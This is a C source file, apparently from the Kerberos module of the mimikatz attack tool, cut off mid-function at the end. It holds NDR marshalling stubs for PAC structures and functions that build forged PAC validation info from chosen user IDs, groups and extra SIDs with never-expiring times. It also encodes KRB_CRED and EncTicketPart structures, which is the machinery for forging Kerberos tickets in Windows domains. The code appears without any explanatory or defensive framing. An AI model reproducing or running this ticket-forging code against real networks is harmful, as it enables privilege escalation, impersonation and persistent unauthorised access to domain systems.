#include "kerb.h"

#include <Midles.h>
#include <wchar.h>
#include <windows.h>

void __RPC_USER ReadFcn(void *State, char **pBuffer, unsigned int *pSize) {
  *pBuffer = (char *)((PKULL_M_RPC_FCNSTRUCT)State)->addr;
  ((PKULL_M_RPC_FCNSTRUCT)State)->addr = *pBuffer + *pSize;
  ((PKULL_M_RPC_FCNSTRUCT)State)->size -= *pSize;
}
#define _ms_pac_MIDL_TYPE_FORMAT_STRING_SIZE 409
#define _ms_pac_PPAC_CREDENTIAL_DATA_idx 2
#define _ms_pac_PKERB_VALIDATION_INFO_idx 108

typedef struct _ms_pac_MIDL_TYPE_FORMAT_STRING {
  SHORT Pad;
  UCHAR Format[_ms_pac_MIDL_TYPE_FORMAT_STRING_SIZE];
} ms_pac_MIDL_TYPE_FORMAT_STRING;

static const ms_pac_MIDL_TYPE_FORMAT_STRING ms_pac__MIDL_TypeFormatString = {
    0,
    {
        0x00, 0x00, 0x12, 0x00, 0x5c, 0x00, 0x1c, 0x01, 0x02, 0x00, 0x17, 0x55,
        0x02, 0x00, 0x01, 0x00, 0x17, 0x55, 0x00, 0x00, 0x01, 0x00, 0x05, 0x5b,
        0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x08, 0x00, 0x06, 0x06, 0x40, 0x36,
        0x5c, 0x5b, 0x12, 0x00, 0xde, 0xff, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00,
        0x10, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00,
        0x0a, 0x00, 0x4c, 0x00, 0xd8, 0xff, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00,
        0xe2, 0xff, 0x21, 0x03, 0x00, 0x00, 0x09, 0x00, 0xf8, 0xff, 0x01, 0x00,
        0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xda, 0xff, 0x5c, 0x5b,
        0x1a, 0x03, 0x08, 0x00, 0xe6, 0xff, 0x00, 0x00, 0x08, 0x40, 0x5c, 0x5b,
        0x12, 0x00, 0xb0, 0x00, 0x15, 0x03, 0x08, 0x00, 0x08, 0x08, 0x5c, 0x5b,
        0x1d, 0x00, 0x08, 0x00, 0x02, 0x5b, 0x15, 0x00, 0x08, 0x00, 0x4c, 0x00,
        0xf4, 0xff, 0x5c, 0x5b, 0x1d, 0x00, 0x10, 0x00, 0x4c, 0x00, 0xf0, 0xff,
        0x5c, 0x5b, 0x15, 0x00, 0x10, 0x00, 0x4c, 0x00, 0xf0, 0xff, 0x5c, 0x5b,
        0x1d, 0x03, 0x08, 0x00, 0x08, 0x5b, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00,
        0x9c, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00,
        0xbc, 0xff, 0x5c, 0x5b, 0x1d, 0x00, 0x06, 0x00, 0x01, 0x5b, 0x15, 0x00,
        0x06, 0x00, 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x1b, 0x03, 0x04, 0x00,
        0x04, 0x00, 0xf9, 0xff, 0x01, 0x00, 0x08, 0x5b, 0x17, 0x03, 0x08, 0x00,
        0xf0, 0xff, 0x02, 0x02, 0x4c, 0x00, 0xe0, 0xff, 0x5c, 0x5b, 0x1a, 0x03,
        0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x36, 0x08, 0x40, 0x5b, 0x12, 0x00,
        0xe4, 0xff, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x10, 0x01, 0x01, 0x00,
        0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xde, 0xff, 0x5c, 0x5b,
        0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x28, 0x01, 0x01, 0x00, 0xff, 0xff,
        0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x56, 0xff, 0x5c, 0x5b, 0x1a, 0x03,
        0x38, 0x01, 0x00, 0x00, 0x60, 0x00, 0x4c, 0x00, 0x48, 0xff, 0x4c, 0x00,
        0x44, 0xff, 0x4c, 0x00, 0x40, 0xff, 0x4c, 0x00, 0x3c, 0xff, 0x4c, 0x00,
        0x38, 0xff, 0x4c, 0x00, 0x34, 0xff, 0x4c, 0x00, 0xd8, 0xfe, 0x4c, 0x00,
        0xd4, 0xfe, 0x4c, 0x00, 0xd0, 0xfe, 0x4c, 0x00, 0xcc, 0xfe, 0x4c, 0x00,
        0xc8, 0xfe, 0x4c, 0x00, 0xc4, 0xfe, 0x06, 0x06, 0x08, 0x08, 0x08, 0x36,
        0x08, 0x4c, 0x00, 0x33, 0xff, 0x40, 0x4c, 0x00, 0xb4, 0xfe, 0x4c, 0x00,
        0xb0, 0xfe, 0x36, 0x4c, 0x00, 0x2f, 0xff, 0x08, 0x08, 0x4c, 0x00, 0xfd,
        0xfe, 0x4c, 0x00, 0xf9, 0xfe, 0x08, 0x08, 0x08, 0x40, 0x36, 0x36, 0x08,
        0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0x1c, 0xff, 0x12, 0x00, 0x4a, 0xff,
        0x12, 0x00, 0x64, 0xff, 0x12, 0x00, 0x42, 0xff, 0x12, 0x00, 0x72, 0xff,
        0x00,
    }};

void __RPC_USER WriteFcn(void *State, char *Buffer, unsigned int Size) {}

PKERB_VALIDATION_INFO kuhl_m_pac_infoToValidationInfo(
    PFILETIME authtime, LPCWSTR username, LPCWSTR domainname,
    LPCWSTR LogonDomainName, PISID sid, ULONG rid, PGROUP_MEMBERSHIP groups,
    DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids) {
  PKERB_VALIDATION_INFO validationInfo = NULL;
  if (validationInfo = (PKERB_VALIDATION_INFO)LocalAlloc(
          LPTR, sizeof(KERB_VALIDATION_INFO))) {
    validationInfo->LogonTime = *authtime;
    KIWI_NEVERTIME(&validationInfo->LogoffTime);
    KIWI_NEVERTIME(&validationInfo->KickOffTime);
    KIWI_NEVERTIME(&validationInfo->PasswordLastSet);
    KIWI_NEVERTIME(&validationInfo->PasswordCanChange);
    KIWI_NEVERTIME(&validationInfo->PasswordMustChange);
    RtlInitUnicodeString(&validationInfo->EffectiveName, username);
    validationInfo->UserId = rid;
    validationInfo->PrimaryGroupId = groups[0].RelativeId;
    validationInfo->GroupCount = cbGroups;
    validationInfo->GroupIds = groups;
    if (LogonDomainName)
      RtlInitUnicodeString(&validationInfo->LogonDomainName, LogonDomainName);
    validationInfo->LogonDomainId = sid;
    validationInfo->UserAccountControl =
        USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
    validationInfo->SidCount = cbSids;
    validationInfo->ExtraSids = sids;
    // validationInfo->ResourceGroupDomainSid = NULL;
    // validationInfo->ResourceGroupCount = 0;
    // validationInfo->ResourceGroupIds = NULL;
    if (validationInfo->ExtraSids && validationInfo->SidCount)
      validationInfo->UserFlags |= 0x20;
    // if(validationInfo->ResourceGroupDomainSid &&
    // validationInfo->ResourceGroupIds && validationInfo->ResourceGroupCount)
    //	validationInfo->UserFlags |= 0x200;
  }
  return validationInfo;
}

// ticket stuff
void kuhl_m_kerberos_ticket_createSequencePrimaryName(
    BerElement *pBer, PKERB_EXTERNAL_NAME name) {
  ber_int_t nameType = name->NameType;
  USHORT i;
  ber_printf(pBer, "{t{i}t{{", MAKE_CTX_TAG(ID_CTX_PRINCIPALNAME_NAME_TYPE),
             nameType, MAKE_CTX_TAG(ID_CTX_PRINCIPALNAME_NAME_STRING));
  for (i = 0; i < name->NameCount; i++)
    kull_m_asn1_GenString(pBer, &name->Names[i]);
  ber_printf(pBer, "}}}");
}
void kuhl_m_kerberos_ticket_createSequenceEncryptedData(BerElement *pBer,
                                                        LONG eType, ULONG kvNo,
                                                        LPCVOID data,
                                                        DWORD size) {
  ber_printf(pBer, "{t{i}", MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_ETYPE), eType);
  if (eType)
    ber_printf(pBer, "t{i}", MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_KVNO), kvNo);
  ber_printf(pBer, "t{o}}", MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_CIPHER), data,
             size);
}

void kuhl_m_kerberos_ticket_createSequenceEncryptionKey(BerElement *pBer,
                                                        LONG eType,
                                                        LPCVOID data,
                                                        DWORD size) {
  ber_printf(pBer, "{t{i}t{o}}", MAKE_CTX_TAG(ID_CTX_ENCRYPTIONKEY_KEYTYPE),
             eType, MAKE_CTX_TAG(ID_CTX_ENCRYPTIONKEY_KEYVALUE), data, size);
}

PBERVAL kuhl_m_kerberos_ticket_createAppKrbCred(PKIWI_KERBEROS_TICKET ticket,
                                                BOOL valueIsTicket) {
  BerElement *pBer, *pBerApp;
  PBERVAL pBerVal = NULL, pBerVallApp = NULL;
  if (pBer = ber_alloc_t(LBER_USE_DER)) {
    ber_printf(pBer, "t{{t{i}t{i}t{", MAKE_APP_TAG(ID_APP_KRB_CRED),
               MAKE_CTX_TAG(ID_CTX_KRB_CRED_PVNO), KERBEROS_VERSION,
               MAKE_CTX_TAG(ID_CTX_KRB_CRED_MSG_TYPE), ID_APP_KRB_CRED,
               MAKE_CTX_TAG(ID_CTX_KRB_CRED_TICKETS));
    if (!valueIsTicket) {
      ber_printf(pBer, "{t{{t{i}t{", MAKE_APP_TAG(ID_APP_TICKET),
                 MAKE_CTX_TAG(ID_CTX_TICKET_TKT_VNO), KERBEROS_VERSION,
                 MAKE_CTX_TAG(ID_CTX_TICKET_REALM));
      kull_m_asn1_GenString(pBer, &ticket->DomainName);
      ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_TICKET_SNAME));
      kuhl_m_kerberos_ticket_createSequencePrimaryName(pBer,
                                                       ticket->ServiceName);
      ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_TICKET_ENC_PART));
      kuhl_m_kerberos_ticket_createSequenceEncryptedData(
          pBer, ticket->TicketEncType, ticket->TicketKvno, ticket->Ticket.Value,
          ticket->Ticket.Length);
      ber_printf(pBer, "}}}}");
    } else
      ber_printf(pBer, "to", DIRTY_ASN1_ID_SEQUENCE, ticket->Ticket.Value,
                 ticket->Ticket.Length);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_KRB_CRED_ENC_PART));
    if (pBerApp = ber_alloc_t(LBER_USE_DER)) {
      ber_printf(pBerApp, "t{{t{{{t{", MAKE_APP_TAG(ID_APP_ENCKRBCREDPART),
                 MAKE_CTX_TAG(ID_CTX_ENCKRBCREDPART_TICKET_INFO),
                 MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_KEY));
      kuhl_m_kerberos_ticket_createSequenceEncryptionKey(
          pBerApp, ticket->KeyType, ticket->Key.Value, ticket->Key.Length);
      ber_printf(pBerApp, "}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PREALM));
      kull_m_asn1_GenString(pBerApp, &ticket->AltTargetDomainName);
      ber_printf(pBerApp, "}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PNAME));
      kuhl_m_kerberos_ticket_createSequencePrimaryName(pBerApp,
                                                       ticket->ClientName);
      ber_printf(pBerApp, "}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_FLAGS));
      kull_m_asn1_BitStringFromULONG(
          pBerApp,
          ticket->TicketFlags); /* ID_CTX_KRBCREDINFO_AUTHTIME not present */
      ber_printf(pBerApp, "}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_STARTTIME));
      kull_m_asn1_GenTime(pBerApp, &ticket->StartTime);
      ber_printf(pBerApp, "}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_ENDTIME));
      kull_m_asn1_GenTime(pBerApp, &ticket->EndTime);
      ber_printf(pBerApp, "}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_RENEW_TILL));
      kull_m_asn1_GenTime(pBerApp, &ticket->RenewUntil);
      ber_printf(pBerApp, "}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SREAL));
      kull_m_asn1_GenString(pBerApp, &ticket->DomainName);
      ber_printf(pBerApp, "}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SNAME));
      kuhl_m_kerberos_ticket_createSequencePrimaryName(pBerApp,
                                                       ticket->ServiceName);
      ber_printf(pBerApp, "}}}}}}");

      if (ber_flatten(pBerApp, &pBerVallApp) >= 0)
        kuhl_m_kerberos_ticket_createSequenceEncryptedData(
            pBer, KERB_ETYPE_NULL, 0, pBerVallApp->bv_val, pBerVallApp->bv_len);
      ber_free(pBerApp, 1);
    }
    ber_printf(pBer, "}}}");
    ber_flatten(pBer, &pBerVal);
    if (pBerVallApp)
      ber_bvfree(pBerVallApp);
    ber_free(pBer, 1);
  }
  return pBerVal;
}

PBERVAL kuhl_m_kerberos_ticket_createAppEncTicketPart(
    PKIWI_KERBEROS_TICKET ticket, LPCVOID PacAuthData, DWORD PacAuthDataSize) {
  BerElement *pBer, *pBerPac;
  PBERVAL pBerVal = NULL, pBerValPac = NULL;
  if (pBer = ber_alloc_t(LBER_USE_DER)) {
    ber_printf(pBer, "t{{t{", MAKE_APP_TAG(ID_APP_ENCTICKETPART),
               MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_FLAGS));
    kull_m_asn1_BitStringFromULONG(pBer, ticket->TicketFlags);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_KEY));
    kuhl_m_kerberos_ticket_createSequenceEncryptionKey(
        pBer, ticket->KeyType, ticket->Key.Value, ticket->Key.Length);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CREALM));
    kull_m_asn1_GenString(pBer, &ticket->AltTargetDomainName);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CNAME));
    kuhl_m_kerberos_ticket_createSequencePrimaryName(pBer, ticket->ClientName);
    ber_printf(pBer, "}t{{t{i}t{o}}}t{",
               MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_TRANSITED),
               MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_TR_TYPE), 0,
               MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_CONTENTS), NULL, 0,
               MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHTIME));
    kull_m_asn1_GenTime(pBer, &ticket->StartTime);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_STARTTIME));
    kull_m_asn1_GenTime(pBer, &ticket->StartTime);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_ENDTIME));
    kull_m_asn1_GenTime(pBer, &ticket->EndTime);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_RENEW_TILL));
    kull_m_asn1_GenTime(pBer, &ticket->RenewUntil);
    ber_printf(pBer, "}"); /* ID_CTX_ENCTICKETPART_CADDR not present */
    if (PacAuthData && PacAuthDataSize) {
      ber_printf(pBer, "t{{{t{i}t{",
                 MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA),
                 MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE),
                 ID_AUTHDATA_AD_IF_RELEVANT,
                 MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA));
      if (pBerPac = ber_alloc_t(LBER_USE_DER)) {
        ber_printf(pBerPac, "{{t{i}t{o}}}",
                   MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE),
                   ID_AUTHDATA_AD_WIN2K_PAC,
                   MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA), PacAuthData,
                   PacAuthDataSize);
        if (ber_flatten(pBerPac, &pBerValPac) >= 0)
          ber_printf(pBer, "o", pBerValPac->bv_val, pBerValPac->bv_len);
        ber_free(pBerPac, 1);
      }
      ber_printf(pBer, "}}}}");
    }
    ber_printf(pBer, "}}");
    ber_flatten(pBer, &pBerVal);
    if (pBerValPac)
      ber_bvfree(pBerValPac);
    ber_free(pBer, 1);
  }
  return pBerVal;
}

// rpc shit

BOOL kull_m_rpc_Generic_Encode(PVOID pObject, PVOID *data, DWORD *size,
                               PGENERIC_RPC_ENCODE fEncode,
                               PGENERIC_RPC_ALIGNSIZE fAlignSize) {
  BOOL status = FALSE;
  RPC_STATUS rpcStatus;
  KULL_M_RPC_FCNSTRUCT UserState;
  handle_t pHandle;

  rpcStatus =
      MesEncodeIncrementalHandleCreate(&UserState, ReadFcn, WriteFcn, &pHandle);
  if (NT_SUCCESS(rpcStatus)) {
    *size = (DWORD)fAlignSize(pHandle, pObject);
    if (*data = LocalAlloc(LPTR, *size)) {
      rpcStatus = MesIncrementalHandleReset(pHandle, NULL, NULL, NULL, NULL,
                                            MES_ENCODE);
      if (NT_SUCCESS(rpcStatus)) {
        UserState.addr = *data;
        UserState.size = *size;
        RpcTryExcept {
          fEncode(pHandle, pObject);
          status = TRUE;
        }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER)
            wprintf(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(),
                    RpcExceptionCode());
        RpcEndExcept
      } else
        wprintf(L"MesIncrementalHandleReset: %08x\n", rpcStatus);

      if (!status) {
        *data = LocalFree(*data);
        *size = 0;
      }
    }
    MesHandleFree(pHandle);
  } else
    wprintf(L"MesEncodeIncrementalHandleCreate: %08x\n", rpcStatus);
  return status;
}

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
#define _ms_pac_MIDL_TYPE_FORMAT_STRING_SIZE 409
#define _ms_pac_PPAC_CREDENTIAL_DATA_idx 2
#define _ms_pac_PKERB_VALIDATION_INFO_idx 108
#elif defined(_M_IX86)
#define _ms_pac_MIDL_TYPE_FORMAT_STRING_SIZE 669
#define _ms_pac_PPAC_CREDENTIAL_DATA_idx 2
#define _ms_pac_PKERB_VALIDATION_INFO_idx 122
#endif

extern const ms_pac_MIDL_TYPE_FORMAT_STRING ms_pac__MIDL_TypeFormatString;
static const RPC_CLIENT_INTERFACE msKrbPac___RpcClientInterface = {
    sizeof(RPC_CLIENT_INTERFACE),
    {{0x00000001,
      0x0001,
      0x0000,
      {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x71}},
     {1, 0}},
    {{0x8a885d04,
      0x1ceb,
      0x11c9,
      {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}},
     {2, 0}},
    0,
    0,
    0,
    0,
    0,
    0x00000000};
static const MIDL_TYPE_PICKLING_INFO __MIDL_TypePicklingInfo = {
    0x33205054, 0x3, 0, 0, 0,
};
static RPC_BINDING_HANDLE msKrbPac__MIDL_AutoBindHandle;
static const MIDL_STUB_DESC msKrbPac_StubDesc = {
    (void *)&msKrbPac___RpcClientInterface,
    MIDL_user_allocate,
    MIDL_user_free,
    &msKrbPac__MIDL_AutoBindHandle,
    0,
    0,
    0,
    0,
    ms_pac__MIDL_TypeFormatString.Format,
    1,
    0x60000,
    0,
    0x8000253,
    0,
    0,
    0,
    0x1,
    0,
    0,
    0};

void PPAC_CREDENTIAL_DATA_Decode(handle_t _MidlEsHandle,
                                 PPAC_CREDENTIAL_DATA *_pType) {
  NdrMesTypeDecode2(_MidlEsHandle,
                    (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
                    &msKrbPac_StubDesc,
                    (PFORMAT_STRING)&ms_pac__MIDL_TypeFormatString
                        .Format[_ms_pac_PPAC_CREDENTIAL_DATA_idx],
                    _pType);
}

void PPAC_CREDENTIAL_DATA_Free(handle_t _MidlEsHandle,
                               PPAC_CREDENTIAL_DATA *_pType) {
  NdrMesTypeFree2(_MidlEsHandle,
                  (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
                  &msKrbPac_StubDesc,
                  (PFORMAT_STRING)&ms_pac__MIDL_TypeFormatString
                      .Format[_ms_pac_PPAC_CREDENTIAL_DATA_idx],
                  _pType);
}

size_t PKERB_VALIDATION_INFO_AlignSize(handle_t _MidlEsHandle,
                                       PKERB_VALIDATION_INFO *_pType) {
  return NdrMesTypeAlignSize2(
      _MidlEsHandle, (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
      &msKrbPac_StubDesc,
      (PFORMAT_STRING)&ms_pac__MIDL_TypeFormatString
          .Format[_ms_pac_PKERB_VALIDATION_INFO_idx],
      _pType);
}

#define _Claims_MIDL_TYPE_FORMAT_STRING_SIZE 371
#define _Claims_MIDL_TYPE_FORMAT_OFFSET 316

typedef struct _Claims_MIDL_TYPE_FORMAT_STRING {
  SHORT Pad;
  UCHAR Format[_Claims_MIDL_TYPE_FORMAT_STRING_SIZE];
} Claims_MIDL_TYPE_FORMAT_STRING;

extern const Claims_MIDL_TYPE_FORMAT_STRING Claims__MIDL_TypeFormatString;

static const Claims_MIDL_TYPE_FORMAT_STRING Claims__MIDL_TypeFormatString = {
    0,
    {
        0x00, 0x00, 0x12, 0x00, 0x20, 0x01, 0x2b, 0x0d, 0x06, 0x00, 0xf8, 0xff,
        0x01, 0x00, 0x02, 0x00, 0x10, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x2c, 0x00, 0x02, 0x00, 0x00, 0x00, 0x44, 0x00, 0x03, 0x00, 0x00, 0x00,
        0x72, 0x00, 0x06, 0x00, 0x00, 0x00, 0x8a, 0x00, 0x00, 0x00, 0xb7, 0x08,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x1b, 0x07, 0x08, 0x00,
        0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0b, 0x5b, 0x1a, 0x03, 0x10, 0x00,
        0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0xe0, 0xff, 0x40, 0x36, 0x5c, 0x5b,
        0x12, 0x00, 0xe2, 0xff, 0xb7, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xa0, 0x00, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00,
        0xec, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0xc4, 0xff, 0xb7, 0x08,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x21, 0x03, 0x00, 0x00,
        0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00,
        0x12, 0x08, 0x25, 0x5c, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00,
        0x0a, 0x00, 0x4c, 0x00, 0xd6, 0xff, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00,
        0xd8, 0xff, 0xb7, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00,
        0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x4c, 0x00, 0xec, 0xff,
        0x40, 0x36, 0x5c, 0x5b, 0x12, 0x00, 0x72, 0xff, 0x1a, 0x03, 0x20, 0x00,
        0x00, 0x00, 0x0a, 0x00, 0x36, 0x0d, 0x40, 0x4c, 0x00, 0x31, 0xff, 0x5b,
        0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x04, 0x00,
        0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xda, 0xff,
        0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x0d, 0x08,
        0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00,
        0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00,
        0xde, 0xff, 0x5c, 0x5b, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x14, 0x00,
        0x01, 0x00, 0x01, 0x5b, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x0a, 0x00,
        0x08, 0x40, 0x36, 0x06, 0x3e, 0x08, 0x36, 0x5b, 0x12, 0x00, 0xcc, 0xff,
        0x12, 0x00, 0xde, 0xff, 0x12, 0x00, 0x1a, 0x00, 0x1b, 0x00, 0x01, 0x00,
        0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x5b, 0x1b, 0x00, 0x01, 0x00,
        0x19, 0x00, 0x1c, 0x00, 0x01, 0x00, 0x01, 0x5b, 0x1a, 0x03, 0x28, 0x00,
        0x00, 0x00, 0x0c, 0x00, 0x08, 0x40, 0x36, 0x0d, 0x08, 0x06, 0x3e, 0x08,
        0x36, 0x5b, 0x12, 0x00, 0xd4, 0xff, 0x12, 0x00, 0xdc, 0xff, 0x00,
    }};

static const RPC_CLIENT_INTERFACE Claims___RpcClientInterface = {
    sizeof(RPC_CLIENT_INTERFACE),
    {{0xbba9cb76,
      0xeb0c,
      0x462c,
      {0xaa, 0x1b, 0x5d, 0x8c, 0x34, 0x41, 0x57, 0x01}},
     {1, 0}},
    {{0x8a885d04,
      0x1ceb,
      0x11c9,
      {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}},
     {2, 0}},
    0,
    0,
    0,
    0,
    0,
    0x00000000};
// static const MIDL_TYPE_PICKLING_INFO __MIDL_TypePicklingInfo = {0x33205054,
// 0x3, 0, 0, 0,};
static RPC_BINDING_HANDLE Claims__MIDL_AutoBindHandle;
static const MIDL_STUB_DESC Claims_StubDesc = {
    (void *)&Claims___RpcClientInterface,
    MIDL_user_allocate,
    MIDL_user_free,
    &Claims__MIDL_AutoBindHandle,
    0,
    0,
    0,
    0,
    Claims__MIDL_TypeFormatString.Format,
    1,
    0x60000,
    0,
    0x8000253,
    0,
    0,
    0,
    0x1,
    0,
    0,
    0};

void PKERB_VALIDATION_INFO_Encode(handle_t _MidlEsHandle,
                                  PKERB_VALIDATION_INFO *_pType) {
  NdrMesTypeEncode2(_MidlEsHandle,
                    (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
                    &msKrbPac_StubDesc,
                    (PFORMAT_STRING)&ms_pac__MIDL_TypeFormatString
                        .Format[_ms_pac_PKERB_VALIDATION_INFO_idx],
                    _pType);
}
size_t PCLAIMS_SET_AlignSize(handle_t _MidlEsHandle, PCLAIMS_SET *_pType) {
  return NdrMesTypeAlignSize2(
      _MidlEsHandle, (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
      &Claims_StubDesc,
      (PFORMAT_STRING)&Claims__MIDL_TypeFormatString.Format[2], _pType);
}

void PCLAIMS_SET_METADATA_Encode(handle_t _MidlEsHandle,
                                 PCLAIMS_SET_METADATA *_pType) {
  NdrMesTypeEncode2(_MidlEsHandle,
                    (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
                    &Claims_StubDesc,
                    (PFORMAT_STRING)&Claims__MIDL_TypeFormatString
                        .Format[_Claims_MIDL_TYPE_FORMAT_OFFSET],
                    _pType);
}
size_t PCLAIMS_SET_METADATA_AlignSize(handle_t _MidlEsHandle,
                                      PCLAIMS_SET_METADATA *_pType) {
  return NdrMesTypeAlignSize2(
      _MidlEsHandle, (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
      &Claims_StubDesc,
      (PFORMAT_STRING)&Claims__MIDL_TypeFormatString
          .Format[_Claims_MIDL_TYPE_FORMAT_OFFSET],
      _pType);
}

void PCLAIMS_SET_Encode(handle_t _MidlEsHandle, PCLAIMS_SET *_pType) {
  NdrMesTypeEncode2(
      _MidlEsHandle, (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
      &Claims_StubDesc,
      (PFORMAT_STRING)&Claims__MIDL_TypeFormatString.Format[2], _pType);
}

void PKERB_VALIDATION_INFO_Decode(handle_t _MidlEsHandle,
                                  PKERB_VALIDATION_INFO *_pType) {
  NdrMesTypeDecode2(_MidlEsHandle,
                    (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
                    &msKrbPac_StubDesc,
                    (PFORMAT_STRING)&ms_pac__MIDL_TypeFormatString
                        .Format[_ms_pac_PKERB_VALIDATION_INFO_idx],
                    _pType);
}

void PKERB_VALIDATION_INFO_Free(handle_t _MidlEsHandle,
                                PKERB_VALIDATION_INFO *_pType) {
  NdrMesTypeFree2(_MidlEsHandle,
                  (PMIDL_TYPE_PICKLING_INFO)&__MIDL_TypePicklingInfo,
                  &msKrbPac_StubDesc,
                  (PFORMAT_STRING)&ms_pac__MIDL_TypeFormatString
                      .Format[_ms_pac_PKERB_VALIDATION_INFO_idx],
                  _pType);
}

BOOL kuhl_m_pac_validationInfo_to_CNAME_TINFO(PFILETIME authtime,
                                              LPCWSTR clientname,
                                              PPAC_CLIENT_INFO *pacClientInfo,
                                              DWORD *pacClientInfoLength) {
  BOOL status = FALSE;
  DWORD len = lstrlenW(clientname) * sizeof(wchar_t);

  *pacClientInfoLength = sizeof(PAC_CLIENT_INFO) + len - sizeof(wchar_t);
  if (*pacClientInfo =
          (PPAC_CLIENT_INFO)LocalAlloc(LPTR, *pacClientInfoLength)) {
    (*pacClientInfo)->ClientId = *authtime;
    (*pacClientInfo)->NameLength = (USHORT)len;
    RtlCopyMemory((*pacClientInfo)->Name, clientname, len);
    status = TRUE;
  }
  return status;
}

BOOL kuhl_m_kerberos_claims_encode_ClaimsSet(PCLAIMS_SET claimsSet,
